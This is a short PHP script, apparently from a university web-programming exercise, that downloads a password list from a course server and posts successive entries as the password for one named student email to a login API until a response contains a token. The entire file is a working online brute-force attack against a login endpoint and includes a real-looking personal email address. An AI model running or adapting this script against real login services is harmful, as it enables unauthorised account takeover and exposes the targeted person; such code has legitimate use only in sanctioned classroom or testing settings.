<?php


$url = "http://topicosweb.celaya.tecnm.mx/TopWeb/passwords.txt";
$url2 = "http://topicosweb.celaya.tecnm.mx/TopWeb/public/api/v1/login";
$email = "l22030128@celaya.tecnm.mx";

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);


$response = curl_exec($ch);

for($i = 14737; $i < 14944; $i++)
    {
        echo "Intento: " . ($i + 1) . "\n";
        $ch2 = curl_init($url2);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_POST, true);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query([
            "email" => $email,
            "password" => explode("\n", $response)[$i]
        ]));
        $response2 = curl_exec($ch2);
        if(strpos($response2, "token") !== false)
        {
            echo "Password found: " . explode("\n", $response)[$i];
            break;
        }
        curl_close($ch2);

    }